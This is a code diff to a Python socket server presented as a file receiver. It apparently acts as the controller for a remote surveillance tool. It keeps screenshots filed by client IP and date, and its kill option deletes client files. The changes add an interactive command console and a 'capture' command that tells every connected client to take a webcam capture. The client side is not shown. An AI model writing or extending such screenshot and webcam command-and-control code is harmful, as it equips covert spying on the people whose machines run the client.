@@ -1,16 +1,34 @@
-import argparse, socket, threading, time, queue, os
+import argparse, socket, threading, time, queue, os, sys
 
 SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
+client_sockets = []
 
 
 # Function to parse the arguments
-def args_parse():
+def args_parse(command_line=None):
     parser = argparse.ArgumentParser(description='Server of file receiver')
     parser.add_argument('-l', '--listen', type=int, default=9809, help='Port to listen on')
     parser.add_argument('-s', '--show', action='store_true', help='Display the list of files received')
     parser.add_argument('-r', '--readfile', nargs='*', type=str, help='Read the content of a file')
     parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
-    return parser.parse_args()
+    parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam')
+
+    if command_line:
+        return parser.parse_args(command_line)
+    else:
+        return parser.parse_args()
+
+
+# Function for the command handler loop
+def command_handler_loop(server_socket):
+    while True:
+        command = input("Server > ")
+        if command:
+            try:
+                args = args_parse(command.split())
+                handle_commands(args, server_socket)
+            except SystemExit:
+                continue
 
 
 # Function to display the list of files received
@@ -31,22 +49,30 @@ def read_file(filename):
 
 
 # Function to handle the commands
-def handle_commands(args, server_socket, client_socket):
+def handle_commands(args, server_socket):
+    global client_sockets
+
     if args.listen:
         print(f"Server listening now on port {args.listen}")
-    elif args.show:
+    if args.show:
         show_files()
-    elif args.readfile:
+    if args.readfile:
         filename = ' '.join(args.readfile)
         read_file(filename)
-    elif args.kill:
-        try:
-            client_socket.sendall('STOP'.encode())
-            server_socket.close()
-            print('Server killed')
-        except socket.error:
-            print('There is no client connected')
-            pass
+    if args.kill:
+        print("Killing the server...")
+        server_socket.close()
+        print("Deleting client files...")
+        # Add your logic for deleting files if needed
+        print("Done")
+        sys.exit(0)
+    if args.capture:
+        for client_socket in client_sockets:
+            try:
+                client_socket.sendall('CAPTURE'.encode())
+                print('Capture command sent to client')
+            except socket.error:
+                print('Error sending capture command to a client')
 
 
 # Function to read the commands
@@ -75,8 +101,10 @@ def setup_server(host, port):
 
 # Function to accept the connections
 def accept_connections(server_socket):
+    global client_sockets
     while True:
         client_socket, client_address = server_socket.accept()
+        client_sockets.append(client_socket)
         print(f"Connection from {client_address}")
         threading.Thread(target=handle_client, args=(client_socket,)).start()
 
@@ -112,10 +140,9 @@ def main():
     host = 'localhost'
     port = args.listen
     server_socket = setup_server(host, port)
-    command_thread = threading.Thread(target=read_commands, args=(server_socket, None))
-    command_thread.daemon = True
-    command_thread.start()
-    accept_connections(server_socket)
+
+    threading.Thread(target=accept_connections, args=(server_socket,)).start()
+    threading.Thread(target=command_handler_loop, args=(server_socket,)).start()
 
 
 if __name__ == '__main__':
